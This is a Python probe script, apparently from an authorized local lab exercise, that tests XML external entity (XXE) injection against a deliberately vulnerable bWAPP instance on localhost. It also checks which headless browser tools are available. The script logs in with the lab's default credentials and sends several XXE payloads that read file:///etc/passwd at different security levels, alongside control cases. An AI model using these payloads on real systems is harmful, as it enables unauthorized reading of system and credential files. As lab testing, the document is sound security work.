#!/usr/bin/env python3
# loop3 t4 probe2: B2 XXE 决定性判定（in-band 回显 via <login>）+ 浏览器/驱动可用性
import re, json, time, subprocess, shutil, os, datetime
import requests

BASE = "http://127.0.0.1"
GAP = 1.2
OUT = {"ts": datetime.datetime.now().isoformat(), "steps": []}


def rec(name, **kw):
    d = {"step": name, **kw}
    OUT["steps"].append(d)
    print(f"--- {name}: " + json.dumps(kw, ensure_ascii=False)[:800], flush=True)
    return d


B = requests.Session()
B.headers["User-Agent"] = "loop3-t4/1.0 (authorized local lab)"
r = B.post(BASE + "/bWAPP/login.php",
           data={"login": "bee", "password": "bug", "security_level": "0", "form": "submit"},
           allow_redirects=False, timeout=20)
rec("login", status=r.status_code, loc=r.headers.get("Location"), phpsessid=B.cookies.get("PHPSESSID"))
time.sleep(GAP)


def xxe(body, tag, seclev=None):
    if seclev is not None:
        B.cookies.set("security_level", str(seclev), domain="127.0.0.1", path="/")
    time.sleep(GAP)
    r = B.post(BASE + "/bWAPP/xxe-2.php", data=body.encode(),
               headers={"Content-Type": "text/xml; charset=UTF-8"}, timeout=25)
    return rec(tag, status=r.status_code, seclev=B.cookies.get("security_level"),
               resp_len=len(r.content), resp=r.text[:400].replace("\n", " "))


# A. 内部实体：<login>&hello;</login> —— login 不存在于库，UPDATE 影响 0 行（零写入）
xxe("""<?xml version="1.0"?><!DOCTYPE r [<!ENTITY hello "loop3canary">]>
<reset><login>&hello;_nosuchuser</login><secret>x</secret></reset>""", "b2_A_internal_entity_in_login", 0)

# B. 外部实体 file:///etc/passwd 放进 login
xxe("""<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<reset><login>&xxe;</login><secret>x</secret></reset>""", "b2_B_file_entity_in_login", 0)

# C. 外部实体 file:// 指向不可能存在的文件（对照）
xxe("""<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///nonexistent_loop3_zzz">]>
<reset><login>&xxe;</login><secret>x</secret></reset>""", "b2_C_file_entity_missing_in_login", 0)

# D. 未定义实体（对照：应解析失败）
xxe("""<?xml version="1.0"?><!DOCTYPE r [<!ENTITY hello "loop3canary">]>
<reset><login>&undefined_loop3;</login><secret>x</secret></reset>""", "b2_D_undefined_entity_in_login", 0)

# E. 无 DOCTYPE 纯文本对照
xxe("""<?xml version="1.0"?><reset><login>plain_loop3</login><secret>x</secret></reset>""",
    "b2_E_plain_no_doctype", 0)

# F. medium(security_level=1) 对照：同样的 file:// 实体（零写入形态：login 不存在）
xxe("""<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<reset><login>&xxe;_nosuchuser</login><secret>x</secret></reset>""", "b2_F_medium_file_entity_in_login", 1)
# G. high(security_level=2) 对照：同上
xxe("""<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<reset><login>&xxe;_nosuchuser</login><secret>x</secret></reset>""", "b2_G_high_file_entity_in_login", 2)
B.cookies.set("security_level", "0", domain="127.0.0.1", path="/")

# ---- 浏览器/驱动可用性 ----
tools = {}
for b in ("chromium", "chromium-browser", "firefox", "chromedriver", "geckodriver", "curl"):
    tools[b] = shutil.which(b) or ""
tools["chromium_version"] = subprocess.run(["chromium", "--version"], capture_output=True, text=True).stdout.strip()
tools["chromium_headless_probe"] = subprocess.run(
    ["chromium", "--headless", "--no-sandbox", "--disable-gpu", "--dump-dom", "about:blank"],
    capture_output=True, text=True, timeout=60).stdout[:120].replace("\n", " ")
tools["sed_available"] = shutil.which("sed") or ""
tools["selenium"] = ""
try:
    import selenium
    tools["selenium"] = selenium.__version__
except Exception as e:
    tools["selenium"] = f"ERR {e}"
for mod in ("websocket", "websockets", "playwright"):
    try:
        m = __import__(mod)
        tools[mod] = getattr(m, "__version__", "ok")
    except Exception as e:
        tools[mod] = f"MISSING"
rec("tooling", **tools)

with open("/tmp/loop3-t4-probe2.json", "w") as f:
    json.dump(OUT, f, ensure_ascii=False, indent=1)
print(json.dumps({"rc": "ok", "steps": len(OUT["steps"])}))
